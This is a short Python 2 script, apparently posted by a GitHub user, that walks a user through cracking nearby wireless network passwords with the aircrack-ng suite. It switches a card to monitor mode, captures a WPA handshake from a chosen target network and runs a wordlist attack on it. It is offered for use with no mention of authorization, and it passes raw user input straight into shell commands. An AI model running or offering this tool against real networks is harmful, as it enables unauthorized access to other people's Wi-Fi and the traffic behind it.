#! /usr/bin/python
# -*- coding: utf-8 -*-
#a small script to help you crack nearby wireless networks.
#this script uses aircrack-ng suite
#author https://github.com/yelhamer
from termcolor import colored
import os
import time
s = """

 ▄▄▄      ██▓██▀███  ▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▀
▒████▄   ▓██▓██ ▒ ██▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒ 
▒██  ▀█▄ ▒██▓██ ░▄█ ▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
░██▄▄▄▄██░██▒██▀▀█▄ ▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
 ▓█   ▓██░██░██▓ ▒██▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █▄
 ▒▒   ▓▒█░▓ ░ ▒▓ ░▒▓░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
  ▒   ▒▒ ░▒ ░ ░▒ ░ ▒░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
  ░   ▒   ▒ ░ ░░   ░░         ░░   ░  ░   ▒  ░       ░ ░░ ░ 
      ░  ░░    ░    ░ ░        ░          ░  ░ ░     ░  ░   
                    ░                        ░              

"""
a = os.system
print s
print colored("This is a simple script that helps you crack your nearby wireless networks passwords", "green")
time.sleep( 5 )
print colored('First, enter your wireless card (usually wlan0) then hit enter', 'green')
time.sleep( 5 )
print colored('It will give you a list of all available wireless networks in your area', 'green')
time.sleep( 5 )
print colored('Copy their BSSID and channel number and save them for later', 'green')
time.sleep( 5 )
print colored('Let\'s role!', 'green')
#askes for wireless card to apply monitor mode on it
wireless_card = raw_input("Enter your wireless card: ")
time.sleep( 1 )
print colored('Thanks', 'green')
time.sleep( 0.5 )
#turns wireless card into monitor mod
mon0 = 'ifconfig '+wireless_card+' down && iwconfig '+wireless_card+' mode monitor && ifconfig '+wireless_card+' up'
a(mon0)
#runs a scan with airodump-ng to get available wifi
airodump = 'airodump-ng '+wireless_card+''
a(airodump)
#asks for your target's bssid
bssid = raw_input("Enter the BSSID of the network you want to crack :")
time.sleep( 0.5 )
#asks for your target's channel
channel = raw_input("Enter the channel number that the wireless network is currently running on:")
time.sleep( 0.5 )
save = raw_input("Where should i save the captured handshake ?")
time.sleep( 0.5)
print colored("Thanks!", "green"),
time.sleep( 0.5 )
print colored(".","red"),
time.sleep( 1 )
print colored(".","red"),
time.sleep( 1 )
print colored(".","red"),
time.sleep( 1 )
print colored("Airodump will start, in the meanwhile, run deauth.py in a new terminal", "red")
time.sleep( 1 )
#starts airodump-ng on a network to capture hanshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c '+channel+' --bssid '+bssid+' -w '+save+' '+wireless_card+' '
a(airodump2)
print colored("Handshake captured", "green")
time.sleep( 1 )
print colored("Cracking the handshake with aircrack-ng will start...", "green")
time.sleep( 2 )
wordlist = raw_input("Specify the path to your wordlist dictionary")
save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
time.sleep( 1 )
print colored("This could take a while according to the wordlist you are using, so be patient", "red")
crack = 'aircrack-ng -a 2 '+save+''+save2+' -w '+wordlist+''
a(crack)
